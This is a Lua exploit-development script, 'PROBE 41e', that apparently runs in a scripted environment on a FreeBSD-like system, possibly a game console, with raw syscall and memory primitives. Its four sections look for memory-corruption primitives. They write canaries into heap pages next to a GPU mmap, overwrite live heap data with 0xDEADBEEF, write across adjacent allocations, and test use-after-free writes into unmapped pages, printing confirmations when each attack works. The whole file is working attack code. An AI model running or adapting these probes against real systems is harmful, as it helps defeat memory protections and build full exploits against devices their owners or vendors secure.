-- CRASH_CLASS: SAFE (writes to our own mmap VA range, read-back only)
-- PROBE 41e: test if adjacent heap pages are WRITABLE from our mmap
-- If yes: we have a heap corruption primitive via GPU mmap adjacency

print("=== PROBE 41e: ADJACENT WRITE TEST ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end

local function hex(n)
    if type(n) == "table" and n.h then
        return string.format("0x%08X%08X", n.h, n.l)
    end
    return string.format("0x%X", tonumber(n) or 0)
end

local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end

local function dump_qword(val)
    if type(val) == "table" and val.h then
        return string.format("%08X_%08X", val.h, val.l)
    end
    return string.format("%016X", to_num(val))
end

local sc_mmap   = make_syscall(477)
local sc_munmap = make_syscall(588)
local PAGE = 0x4000

local function do_mmap(sz)
    local ok, ret = pcall(function()
        return sc_mmap(
            uint64(0), uint64(sz), uint64(0x33),
            uint64(0x1002),
            uint64("0xFFFFFFFFFFFFFFFF"), uint64(0)
        )
    end)
    if not ok then return nil end
    local addr = to_num(ret)
    if addr == 0 or addr >= 0xFFFFFFFF00000000 then return nil end
    return addr
end

--------------------------------------------------------------------
-- Allocate anchor
--------------------------------------------------------------------
local base = do_mmap(PAGE)
if not base then
    print("mmap FAILED")
    print("=== PROBE 41e COMPLETE ===")
    return
end
print("anchor: " .. hex(base))

-- verify our own page is writable
pcall(function() memory.write_dword(base, 0xAAAAAAAA) end)
local ok_v, vv = pcall(function() return memory.read_dword(base) end)
print("own page write: " .. (ok_v and hex(vv) or "FAILED"))
print("")

--------------------------------------------------------------------
-- SECTION 1: Write test at specific offsets before our mmap
-- Try writing a canary, read it back, then RESTORE original value
--------------------------------------------------------------------
print("--- SECTION 1: WRITE TEST (backward, restore after) ---")

local offsets_to_test = {
    -0x1000, -0x2000, -0x3000, -0x4000,
    -0x8000, -0x10000, -0x20000, -0x40000,
    -0x80000,
}

local canary = 0x41424344  -- "ABCD"
local results = {}

for _, off in ipairs(offsets_to_test) do
    local addr = base + off
    if addr <= 0 then break end

    -- 1. read original
    local ok_r, orig = pcall(function() return memory.read_dword(addr) end)
    if not ok_r then
        results[#results + 1] = string.format("  [%+07X] %s READ_FAIL (unmapped)", off, hex(addr))
    else
        local orig_val = to_num(orig)

        -- 2. write canary
        local ok_w = pcall(function() memory.write_dword(addr, canary) end)
        if not ok_w then
            results[#results + 1] = string.format("  [%+07X] %s R=Y W=N (read-only) orig=%s",
                off, hex(addr), hex(orig_val))
        else
            -- 3. read back
            local ok_rb, rb = pcall(function() return memory.read_dword(addr) end)
            local rb_val = ok_rb and to_num(rb) or -1

            if rb_val == canary then
                results[#results + 1] = string.format(
                    "  [%+07X] %s R=Y W=Y CONFIRMED orig=%s",
                    off, hex(addr), hex(orig_val))

                -- 4. restore original
                pcall(function() memory.write_dword(addr, orig_val) end)
            else
                results[#results + 1] = string.format(
                    "  [%+07X] %s R=Y W=? wrote=%s readback=%s",
                    off, hex(addr), hex(canary), hex(rb_val))
            end
        end
    end
end

local write_count = 0
for _, r in ipairs(results) do
    print(r)
    if r:find("W=Y CONFIRMED") then write_count = write_count + 1 end
end
print("")
print("writable pages: " .. write_count .. " / " .. #results)
print("")

--------------------------------------------------------------------
-- SECTION 2: Write to non-zero heap page (prove we can corrupt heap)
-- Find first non-zero page, save 8 bytes, write, verify, restore
--------------------------------------------------------------------
print("--- SECTION 2: HEAP DATA CORRUPTION TEST ---")
do
    local target = nil
    local target_off = nil
    for i = 1, 512 do
        local addr = base - i * 0x1000
        if addr <= 0 then break end
        local ok_r, val = pcall(function() return memory.read_dword(addr) end)
        if ok_r and to_num(val) ~= 0 then
            target = addr
            target_off = -i * 0x1000
            break
        end
    end

    if target then
        print("  target: " .. hex(target) .. " (offset " .. hex(target_off) .. ")")

        -- save original qword
        local ok_ro, orig_q = pcall(function() return memory.read_qword(target) end)
        if ok_ro then
            print("  original: " .. dump_qword(orig_q))

            -- write our pattern
            local ok_w1 = pcall(function() memory.write_dword(target, 0xDEADBEEF) end)
            local ok_w2 = pcall(function() memory.write_dword(target + 4, 0xCAFEF00D) end)

            if ok_w1 and ok_w2 then
                -- read back
                local ok_rb, rb_q = pcall(function() return memory.read_qword(target) end)
                if ok_rb then
                    print("  after write: " .. dump_qword(rb_q))
                    local hi, lo
                    if type(rb_q) == "table" and rb_q.h then
                        hi = rb_q.h
                        lo = rb_q.l
                    else
                        hi = 0
                        lo = to_num(rb_q)
                    end
                    if lo == 0xDEADBEEF and hi == 0xCAFEF00D then
                        print("  *** HEAP WRITE CONFIRMED ***")
                        print("  We can read AND write stale heap data!")
                    elseif lo == 0xDEADBEEF then
                        print("  *** PARTIAL WRITE (lo confirmed) ***")
                    else
                        print("  write did not stick: " .. dump_qword(rb_q))
                    end
                end

                -- restore
                if type(orig_q) == "table" and orig_q.h then
                    pcall(function() memory.write_dword(target, orig_q.l) end)
                    pcall(function() memory.write_dword(target + 4, orig_q.h) end)
                else
                    pcall(function() memory.write_dword(target, to_num(orig_q)) end)
                    pcall(function() memory.write_dword(target + 4, 0) end)
                end
                local ok_rv, rv_q = pcall(function() return memory.read_qword(target) end)
                if ok_rv then
                    print("  restored: " .. dump_qword(rv_q))
                end
            else
                print("  write FAILED: w1=" .. tostring(ok_w1) .. " w2=" .. tostring(ok_w2))
            end
        end
    else
        print("  no non-zero page found")
    end
end
print("")

--------------------------------------------------------------------
-- SECTION 3: Cross-alloc write test
-- Alloc two contiguous pages, write from page1 into page2's VA
--------------------------------------------------------------------
print("--- SECTION 3: CROSS-ALLOC WRITE ---")
do
    local a1 = do_mmap(PAGE)
    local a2 = do_mmap(PAGE)
    if a1 and a2 then
        local lo = math.min(a1, a2)
        local hi = math.max(a1, a2)
        local gap = hi - lo - PAGE
        print("  a1=" .. hex(a1) .. " a2=" .. hex(a2) .. " gap=" .. hex(gap))

        if gap == 0 then
            -- write via a1 into a2's space
            pcall(function() memory.write_dword(lo + PAGE, 0x55667788) end)
            local ok_r, rv = pcall(function() return memory.read_dword(hi) end)
            if ok_r and to_num(rv) == 0x55667788 then
                print("  CROSS-ALLOC WRITE CONFIRMED")
                print("  wrote to a1+PAGE, read from a2: " .. hex(rv))
            else
                print("  cross-alloc read: " .. (ok_r and hex(rv) or "FAIL"))
            end
        else
            print("  not contiguous, testing write to gap")
            local gap_addr = lo + PAGE
            local ok_gr, gv = pcall(function() return memory.read_dword(gap_addr) end)
            if ok_gr then
                local orig = to_num(gv)
                local ok_gw = pcall(function() memory.write_dword(gap_addr, 0x99AABBCC) end)
                local ok_grb, grb = pcall(function() return memory.read_dword(gap_addr) end)
                print("  gap write: " .. (ok_gw and "OK" or "FAIL") ..
                      " readback: " .. (ok_grb and hex(grb) or "FAIL"))
                pcall(function() memory.write_dword(gap_addr, orig) end)
            else
                print("  gap not readable")
            end
        end

        pcall(function() sc_munmap(uint64(a1), uint64(PAGE)) end)
        pcall(function() sc_munmap(uint64(a2), uint64(PAGE)) end)
    end
end
print("")

--------------------------------------------------------------------
-- SECTION 4: Freed-page write test
-- Alloc, free, alloc new anchor, write into freed VA
--------------------------------------------------------------------
print("--- SECTION 4: USE-AFTER-FREE WRITE ---")
do
    local victim = do_mmap(PAGE)
    if victim then
        pcall(function() memory.write_dword(victim, 0x11223344) end)
        print("  victim alloc: " .. hex(victim))

        -- free it
        pcall(function() sc_munmap(uint64(victim), uint64(PAGE)) end)
        print("  victim freed")

        -- alloc new anchor nearby
        local anchor2 = do_mmap(PAGE)
        if anchor2 then
            print("  new anchor: " .. hex(anchor2))
            local dist = (anchor2 > victim) and (anchor2 - victim) or (victim - anchor2)
            print("  distance: " .. hex(dist))

            -- try to read the freed page
            local ok_r, rv = pcall(function() return memory.read_dword(victim) end)
            if ok_r then
                print("  read freed page: " .. hex(rv) .. " READABLE")
                local ok_w = pcall(function() memory.write_dword(victim, 0xAABBCCDD) end)
                if ok_w then
                    local ok_rb, rb = pcall(function() return memory.read_dword(victim) end)
                    if ok_rb and to_num(rb) == 0xAABBCCDD then
                        print("  *** USE-AFTER-FREE WRITE CONFIRMED ***")
                    else
                        print("  write readback: " .. (ok_rb and hex(rb) or "FAIL"))
                    end
                else
                    print("  write to freed page FAILED")
                end
            else
                print("  freed page not readable (properly unmapped)")
            end

            pcall(function() sc_munmap(uint64(anchor2), uint64(PAGE)) end)
        end
    end
end

print("")
print("=== PROBE 41e COMPLETE ===")
